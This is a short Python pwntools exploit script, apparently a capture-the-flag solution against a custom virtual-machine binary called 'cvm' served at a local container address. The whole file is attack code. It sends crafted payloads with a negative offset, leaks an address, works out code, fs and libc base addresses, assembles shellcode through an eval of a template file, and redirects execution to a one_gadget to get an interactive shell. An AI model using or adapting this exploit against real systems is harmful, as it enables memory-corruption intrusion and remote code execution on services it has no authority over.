from ctypes import *
from pwn import *
context(arch='amd64',log_level='debug',terminal=['tmux','splitw','-h'])
payload1=p64(0)*4+p64(0x8000)+bytes(c_int64(-0x20000))+p64(141)
payload2=b'\x00'*152+open('./loader.bin','rb').read()
#p=gdb.debug('./cvm')
#p=process('./cvm')
p=connect('172.17.0.3',9999)
#gdb.attach(p)
pause()
p.sendafter(b'here!',payload1)
pause()
p.send(payload2)
addr = u64(p.recv(8))
success(hex(addr))
code_base=addr-0x20000
fs_base=addr+0x20740
libc_base=fs_base+0x7fd6eec77000-0x7fd6eeb87740
one_gadget=libc_base+0xeb58e
open('./tmp.asm','w').write(eval("f'''"+open('./exp.asm','r').read()+"'''"))
os.system('python assembler.py tmp.asm exp.bin')
payload3=open('./exp.bin','rb').read().ljust(0x308,b'\0')+p32(8)
payload3=payload3.ljust(0x400,b'\0')+flat({0:p64(0),8:p64((code_base+0x5000)<<0x11),0x10:p64(0),0x30:p64((code_base+0x6000)<<0x11),0x38:p64(one_gadget<<0x11)})
p.send(payload3)
p.interactive()
